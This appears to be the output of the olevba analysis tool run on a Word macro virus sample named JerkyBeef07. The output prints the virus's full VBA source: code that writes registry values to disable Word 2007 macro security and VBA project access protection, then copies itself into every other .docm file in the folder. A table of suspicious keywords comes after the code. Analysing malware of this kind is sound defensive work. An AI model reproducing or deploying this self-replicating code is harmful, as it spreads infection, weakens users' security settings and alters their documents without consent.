olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.JerkyBeef07.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.JerkyBeef07.a - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub BeefJerky()
'Word2007.BeefJerky
'(c)Necronomikon[Doomriderz]
'only .docm files can be infected as normal docx files can not contain macro code.
'to run correctly this code must be saved in a .docm macro-enabled word document
'in the "ThisDocument" module. Enjoy^^
Dim shell
Dim module As Integer: module = 1
Dim line As Integer: line = 1
Dim vircode As String
Dim File_Ext As String: File_Ext = ".docm"

Set fso = CreateObject(("Scripting" + ".FileSystemObject"))
Set shell = CreateObject(("WScript" + ".Shell"))
Select Case Application.Version
Case "12.0"
     RegPath = "HKCU\Software\Microsoft\Office\12.0\Word\Security\"
 shell.RegWrite RegPath & "Level", 1, "REG_DWORD"
 shell.RegWrite RegPath & "AccessVBOM", 1, "REG_DWORD"
    Case "11.0"
    End
    Case "10.0"
    End
    Case "9.0"
    End
    Case "8.0"
    End
    End Select
 
vircode = ActiveDocument.VBProject.VBComponents(module). _
CodeModule.Lines(line, ActiveDocument.VBProject.VBComponents(module). _
CodeModule.CountOfLines)

 For Each FileName In fso.getfolder(".").Files
            If FileName <> fso.getfolder(".") & "\" & ActiveDocument.Name Then
                If InStr(FileName, File_Ext) Then
                    Documents.Open (FileName)
                    If Word.ActiveDocument.VBProject.VBComponents(module). _
                        CodeModule.Lines(line, line) <> "Sub BeefJerky()" Then
                        Word.ActiveDocument.VBProject.VBComponents.Item(module). _
                        CodeModule.InsertLines line, vircode
                    End If
                    Word.ActiveDocument.Save
                    Word.ActiveDocument.Close
                 End If
            End If
        Next
        
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

